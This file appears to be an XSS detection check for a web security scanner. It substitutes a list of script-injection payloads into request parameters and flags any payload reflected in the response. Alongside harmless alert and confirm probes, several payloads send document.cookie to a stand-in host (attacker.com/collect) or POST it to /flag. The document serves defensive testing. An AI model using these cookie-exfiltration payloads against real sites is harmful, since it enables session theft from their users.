metadata:
  language: v1-beta
  name: "XSS-check"
  description: "Checks for potential XSS vulnerabilities"
  author: "SecGPT"

run for each:
  potential_payloads:
    - "<img src=x onerror=alert(1)>"
    - "<svg/onload=alert(1)>"
    - "<body onload=alert(1)>"
    - "<iframe src='javascript:alert(1)'>"
    - "<div style='width:expression(alert(1))'>"
    - "<img src=x onerror=window.location='https://attacker.com/collect?cookie='+document.cookie>"
    - "<svg/onload=fetch('/flag',{method:'POST',body:document.cookie})>"
    - "<img src=x onerror=fetch('https://attacker.com/collect',{method:'POST',body:document.cookie})>"
    - "<img src='x' onerror='window.location=`javascript:alert(1)`'>"
    - "<img src=x onerror=confirm(1)>"
    - "<svg/onload=confirm(1)>"
    - "<body onload=confirm(1)>"
    - "<iframe src='javascript:confirm(1)'>"
    - "<div style='width:expression(confirm(1))'>"
    - "<img src=x onerror=window.location='https://attacker.com/collect?cookie='+document.cookie>"
    - "<svg/onload=fetch('/flag',{method:'POST',body:document.cookie})>"
    - "<img src=x onerror=fetch('https://attacker.com/collect',{method:'POST',body:document.cookie})>"
    - "<img src='x' onerror='window.location=`javascript:confirm(1)`'>"

given request then
  for each potential_payload in potential_payloads then
    send request called check:
      method: {request.method}
      path: {request.path}
      parameters: {request.parameters.replace("PLACEHOLDER", potential_payload)}
      body: {request.body}

    if potential_payload in {check.response.body} then
      report issue:
        name: "Potential XSS vulnerability detected"
        severity: high
        confidence: certain
        description: "The application may be vulnerable to Cross-Site Scripting (XSS). The payload `{potential_payload}` was reflected in the HTTP response."
        remediation: "Implement proper output encoding and input validation to prevent XSS attacks."
        evidence: {check.response.body}
								